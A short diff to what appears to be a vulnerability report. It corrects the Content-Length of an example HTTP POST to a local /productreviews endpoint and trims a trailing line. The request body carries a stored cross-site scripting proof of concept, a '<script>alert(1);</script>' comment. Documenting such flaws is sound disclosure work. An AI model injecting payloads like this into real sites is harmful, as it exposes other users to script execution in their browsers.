@@ -31,7 +31,7 @@ Successful exploitation looks like:
 
     POST /productreviews HTTP/1.1
     Host: 127.0.0.1:8081
-    Content-Length: 82
+    Content-Length: 90
     sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
     Accept: application/json, text/plain, */*
     Content-Type: application/json
@@ -50,4 +50,3 @@ Successful exploitation looks like:
     Connection: close
 
     {"product":{"id":1},"title":"Disgusting","grade":1,"comment":"<script>alert(1);</script>"}
-
